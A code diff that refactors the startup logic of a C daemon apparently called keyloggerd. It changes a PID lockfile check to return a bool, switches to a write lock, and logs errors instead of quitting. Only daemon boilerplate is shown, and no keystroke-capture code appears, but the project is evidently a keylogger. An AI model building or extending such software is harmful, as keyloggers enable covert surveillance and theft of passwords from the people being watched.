@@ -1,6 +1,7 @@
 #include <errno.h>      /* for errno */
 #include <fcntl.h>      /* for open */
 #include <signal.h>     /* for sigaction */
+#include <stdbool.h>    /* for bool */
 #include <stdio.h>
 #include <stdlib.h>     /* for exit  */
 #include <string.h>     /* for strerror */
@@ -141,7 +142,7 @@ static void daemonize(void)
 /**
  * Ensure that only one copy of the daemon is running
  */
-static int already_running(void)
+static bool is_daemon_already_running(void)
 {
     int fd;
 
@@ -151,25 +152,27 @@ static int already_running(void)
     fd = open(LOCKFILE, oflag, mode);
 
     if (fd == ERROR) {
-        err_quit("Failed to open %s: %s", LOCKFILE, strerror(errno));
+        klog.error("Failed to open %s: %s", LOCKFILE, strerror(errno));
+        return true;
     }
 
     struct flock lockp = {
-        .l_type = F_RDLCK,
+        .l_type = F_WRLCK,
         .l_whence = SEEK_CUR,
         .l_start = 0,
         .l_len = 16,
     };
 
     if (fcntl(fd, F_SETLK, &lockp) == ERROR) {
-        err_quit("Failed to lock %s: %s", LOCKFILE, strerror(errno));
+        klog.error("Failed to lock %s: %s", LOCKFILE, strerror(errno));
+        return true;
     }
 
     char buf[16];
     sprintf(buf, "%ld", (long) getpid());
     write(fd, buf, strlen(buf)+1);
 
-    return OK;
+    return false;
 }
 
 int main(int argc, char *argv[])
@@ -178,15 +181,15 @@ int main(int argc, char *argv[])
 
     if (cmd_args) {
         daemonize();
+
+        if (is_daemon_already_running()) {
+            err_quit("Aborting since keyloggerd is already running");
+        }
+
+        keyloggerd();
+
+        klog.info("Daemon finished");
     }
-
-    if (already_running()) {
-        err_quit("Daemon is already running");
-    }
-
-    keyloggerd();
-
-    klog.info("Daemon finished");
 
     exit(0);
 }
